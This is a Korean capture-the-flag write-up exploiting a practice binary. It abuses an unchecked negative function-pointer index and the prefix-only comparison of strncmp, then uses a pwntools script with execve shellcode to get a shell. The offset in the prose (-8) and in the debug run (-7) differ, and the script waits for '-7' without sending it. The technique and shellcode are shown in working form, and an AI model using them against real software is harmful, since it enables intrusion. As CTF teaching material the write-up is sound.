# 상준이가 문제 줌
### Thx to s0ngsari
---
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+Ch] [bp-4h]@2

  init();
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  while ( 1 )
  {
    menu();
    putchar(0x3E);
    __isoc99_scanf("%d", &v4);
    if ( v4 > 3 )
      break;
    (fptr[v4])("%d", &v4);
  }
  return 0;
}
```
상준이에게 받은 바이너리를 IDA로 열어보고 main루틴을 확인했다.

```c
int menu()
{
  puts(&byte_400B35);
  puts("1. Login");
  puts("2. Logout");
  return puts("3. Exit");
}
```
메뉴 함수는 단순하게 메뉴만 출력해준다.

그리고 scanf 함수를 통해 입력 받는다.

입력 받은 값은 함수포인터 fptr[v4] 에 의해 해당 루틴이 호출된다.

```
.bss:00000000006010E0 ; __int64 fptr[]
.bss:00000000006010E0 fptr            dq ?                    ; DATA XREF: main+8Cr
.bss:00000000006010E8 login_0         dq ?                    ; DATA XREF: init+4w
.bss:00000000006010F0 logout_0        dq ?                    ; DATA XREF: init+Fw
.bss:00000000006010F8 exit_func_0     dq ?                    ; DATA XREF: init+1Aw
```
* fptr[1] = login
* fptr[2] = logout
* fptr[3] = exit

이렇게 정의 되어 있다. 차례대로 살펴보자

```c
int login()
{
  int result; // eax@2

  if ( login_chk == 1 )
  {
    puts("[-] Login already ");
    result = 0;
  }
  else
  {
    printf("ID: ");
    read(STDIN_FILENO, id, 49uLL);
    printf("Password: ", id);
    read(0, password, 49uLL);
    if ( !strncmp(id, "admin", 5uLL) && !strncmp(password, "admin!", 6uLL) )
    {
      result = puts("[+] Access");
      login_chk = 1;
    }
    else
    {
      result = puts("[-] Access Denied");
    }
    login_chk = 0;
  }
  return result;
}
```
먼저 ID와 Password 를 read 함수를 통해 입력받는다.

```
.bss:0000000000601120 ; char id[56]
```
overflow는 발생하지 않았다.

입력받은 값을 strncmp 함수를 통해 비교한다. 조건부는 아래와 같다
* ID 값은 admin 이여야 함
* password 는 admin! 이여야 함
* 둘을 동시에 만족해야 함

```c
int logout()
{
  int result; // eax@2

  if ( login_chk )
  {
    memset(id, 0, 50uLL);
    memset(password, 0, 50uLL);
    login_chk = 0;
    result = puts("[+] Logout");
  }
  else
  {
    puts("[-] Login First");
    result = 0;
  }
  return result;
}
```
logout 함수다 별 기능이 없어 보인다.

```c
void __noreturn exit_func()
{
  puts("Bye Bye~");
  exit(0);
}
```
exit 함수 또한 특별한 기능은 없다.

간단하게 살펴본 코드 중 문제가 되는 부분은 아래의 두 가지다.

##### 함수포인터를 int 형으로 입력받는다.
```c
__isoc99_scanf("%d", &v4);
if ( v4 > 3 )
  break;
(fptr[v4])("%d", &v4);
```

if문을 통해 입력받은 값이 3보다 클때 break 문을 통해 빠져나오게 끔 했으나. 음수 값을 필터링 하지 않고 있다. 따라서 음수 값을 입력함으로써 함수 포인터를 조작할 수 있다.

##### 큰 배열에 strncmp를 사용한다.
```c
if ( !strncmp(id, "admin", 5uLL) && !strncmp(password, "admin!", 6uLL) )
{
  result = puts("[+] Access");
  login_chk = 1;
}
```
strncmp의 특징은 비교대상(문자열)을 세번째 인자만큼 비교하며 비교 결과가 참이면 뒤의 문자열을 신경쓰지 않는다. 따라서 뒤의 공간을 활용할 수 있게 된다.

두 가지 문제점을 사용하여 바이너리의 공격이 가능하다.

```
.bss:00000000006010A0 password        db 34h dup(?)           ; DATA XREF: login+5Ao
.bss:00000000006010A0                                         ; login+8Bo ...
.bss:00000000006010D4                 public login_chk
.bss:00000000006010D4 login_chk       dd ?                    ; DATA XREF: login+4r
.bss:00000000006010D4                                         ; login+A3w ...
.bss:00000000006010D8                 align 20h
.bss:00000000006010E0                 public fptr
.bss:00000000006010E0 ; __int64 fptr[]
```
먼저 함수 포인터 fptr이 password까지 거리는 hex(0x6010e0 - 0x6010a0) / 8 = 8이다.

-8을 넣으면 password가 가지고 있는 값이 RIP로 바뀔 것이다.

그리고 strncmp가 admin! 문자열만 비교한다는 특성을 이용하여 RIP 컨트롤이 되는지 확인했다.

```
pwndbg> r
Starting program: /home/secretpack/Desktop/admin

1. Login
2. Logout
3. Exit
>1
ID: admin
Password: admin!AABBBB
[+] Access

1. Login
2. Logout
3. Exit
>-7

Program received signal SIGSEGV, Segmentation fault.
0x0000000a42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x10
 RDX  0xa42424242
 RDI  0x7fffffffdf90 ◂— 0x372d /* '-7' */
 RSI  0x1
 R8   0x0
 R9   0x0
 R10  0x0
 R11  0x7ffff7b845e0 (_nl_C_LC_CTYPE_class+256) ◂— add    al, byte ptr [rax]
 R12  0x400710 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffe5a0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffe4c0 —▸ 0x400a40 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffe4a8 —▸ 0x400a32 (main+155) ◂— jmp    0x4009e5
 RIP  0xa42424242
─────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────
Invalid address 0xa42424242

──────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffe4a8 —▸ 0x400a32 (main+155) ◂— jmp    0x4009e5
01:0008│      0x7fffffffe4b0 —▸ 0x7fffffffe5a0 ◂— 0x1
02:0010│      0x7fffffffe4b8 ◂— 0xfffffff900000000
03:0018│ rbp  0x7fffffffe4c0 —▸ 0x400a40 (__libc_csu_init) ◂— push   r15
04:0020│      0x7fffffffe4c8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
05:0028│      0x7fffffffe4d0 ◂— 0x0
06:0030│      0x7fffffffe4d8 —▸ 0x7fffffffe5a8 —▸ 0x7fffffffe7dc ◂— 0x65732f656d6f682f ('/home/se')
07:0038│      0x7fffffffe4e0 ◂— 0x1f7ffcca0
────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► f 0        a42424242
   f 1           400a32 main+155
   f 2     7ffff7a2d830 __libc_start_main+240
Program received signal SIGSEGV (fault address 0xa42424242)

```
정상적으로 RIP를 바꾼 것을 확인 했다. 이제 익스 해보자.

```
secretpack@ubuntu:~/Desktop$ pwn checksec admin
[*] '/home/secretpack/Desktop/admin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
NX disabled 이므로 shell code를 사용할 수 있다.

```python
from pwn import*

p = process("./admin")

p.recvuntil(">")
p.sendline("1")

p.recvuntil("ID: ")
p.sendline("admin")

p.recvuntil("Password: ")

payload = "admin!AA"
payload += p64(0x6010a0 + 17)
payload += "\x90"*6
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\
             \x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\
             \x57\x54\x5e\xb0\x3b\x0f\x05"
payload += shellcode

p.sendline(payload)

p.recvuntil("-7")

p.interactive()
```
##### 결과
```
secretpack@ubuntu:~/Desktop$ python exp.py
[+] Starting local process './admin': pid 128115
[*] Switching to interactive mode
$ id
uid=1000(secretpack) gid=1000(secretpack) groups=1000(secretpack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```
